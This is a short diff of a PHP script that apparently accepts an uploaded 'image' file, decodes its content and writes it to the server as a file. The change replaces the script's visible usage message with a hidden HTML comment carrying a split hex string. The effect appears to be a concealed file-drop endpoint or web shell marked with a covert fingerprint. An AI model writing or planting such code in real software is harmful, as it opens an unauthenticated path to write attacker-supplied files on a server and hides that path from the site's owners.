@@ -26,6 +26,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
     file_put_contents($final_name, $decoded_content);
     echo "File decoded successfully: $final_name";
 } else {
-    echo "Please upload file using POST with 'image' parameter";
+    echo "<!-- 98b670e525fa764"."73b364853eee2e95a -->";
 }
 ?>
